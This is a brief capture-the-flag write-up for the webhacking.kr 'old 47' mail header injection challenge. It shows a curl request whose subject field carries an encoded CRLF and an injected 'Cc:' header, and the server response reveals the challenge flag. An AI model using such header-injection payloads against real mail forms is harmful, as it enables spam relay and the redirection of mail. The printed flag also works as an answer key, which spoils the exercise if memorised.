# Old 47    Mail Header Injection

URL: [https://webhacking.kr/challenge/bonus-11/](https://webhacking.kr/challenge/bonus-11/)

IMAGE

Seems like we have to get mail. Since there's no fields for email input we have to inject it. `Cc` and `Bcc` can be utilized so we can be include in the email:
```powershell
➜ curl "https://webhacking.kr/challenge/bonus-11/" `
>   -H "Cookie: PHPSESSID=3052403292" `
>   -H "Referer: https://webhacking.kr/challenge/bonus-11/" `
>   -d "subject=Flag+of+webhacking.kr+old-47+chall%0D%0ACc: rasosa7682@lucvu.com"
<html>
<head>
<title>Challenge 47</title>
</head>
<body>
<form method=post name=mailfrm>
Mail subject : <input type=text name=subject size=50 value="Flag of webhacking.kr old-47 chall" maxlength=50><input type=submit value=send>
</form>
<hr>Mail has been sent<hr>FLAG{wasted_too_much_time_damn}
```

::: info Note
Email is not received. 
:::
> `CC` didn't work... only `Cc`
> After `Cc:` you need space -> `Cc: email`

